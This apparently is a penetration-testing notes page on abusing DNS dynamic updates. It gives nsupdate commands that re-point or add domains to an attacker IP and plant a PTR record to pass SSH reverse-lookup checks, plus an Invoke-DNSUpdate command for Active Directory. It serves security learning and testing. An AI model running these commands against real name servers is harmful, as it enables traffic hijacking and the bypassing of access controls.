# Dynamic updates

{% tabs %}
{% tab title="Unix*" %}
### nsupdate

`nsupdate` is used to send dynamic DNS update requests, as defined in RFC2136, to a name server. This allows adding or removing resource records from a zone without manually editing the zone file. A single update request can contain requests to add or remove more than one resource record.

Zones that are under dynamic control via `nsupdate` or a DHCP server should not be edited by hand. Manual edits could conflict with dynamic updates and result in data loss.

Resource records that are dynamically added or deleted with `nsupdate` have to be in the same zone. Requests are sent to the zone master server. This is identified by the MNAME field of the zone's SOA record.

#### Connect

```bash
# Connect (remote):
nsupdate
> server <DNS_IP>

# Connect with key:
nsupdate -k /etc/bind/<KEY>.key
> server <DNS_IP>
```

#### Change IP from a domain name

```bash
nsupdate
> update delete test.example.com
> update add test.example.com 86400 A <IP ATTACKER> # The newly added record has a TTL of 1 day (86400 seconds).
> send
```

#### Add new domain with attacker IP

```bash
# Add new domain with attacker IP.
> update add test.example.com 86400 IN A <ATTACKER IP>
> send
# - We can try nslookup if it works:
nslookup
> server <DNS_IP>
> <DOMAIN>
```

#### Add a reverse lookup (PTR) on a domain

Useful if SSH allows you to connect only for a specific domain or hostname (in this case, you would have to add a domain pointing to your IP) because this service does a reverse lookup:

```bash
nslookup
> server <DNS_IP>
> <ATTACKER_IP>
# - We copy the domain that gives us as error,
# since it can not find it (<COPY_DOMAIN>)
nsupdate
> update add <COPY_DOMAIN> 300 IN PTR <DOMAIN> # AÃ±adir un reverse lookup, para que SSH encuentre el dominio que apunta hacia nosotros.
> send
```
{% endtab %}

{% tab title="Windows" %}
### Invoke-DNSUpdate

As we said in the theory part, dynamic updates allow clients to create/modify/delete DNS records. In Active Directory by default only secured dynamic updates are allowed. This means that DNS records are protected by ACLs and only authorized users can modify them.

**By default, any user can create a new DNS record** (the user becomes its owner) and only the owner can update or delete the DNS record. Therefore, access is denied if a user wants to create a DNS record that already exists.&#x20;

To create new DNS records through dynamic DNS updates the [Invoke-DNSUpdate](https://github.com/Kevin-Robertson/Powermad#invoke-dnsupdate) script is used.

```bash
# Add test.contoso.local pointing to our IP:
Invoke-DNSUpdate -DNSType A -DNSName test -DNSData <IP> -Verbose
```
{% endtab %}
{% endtabs %}
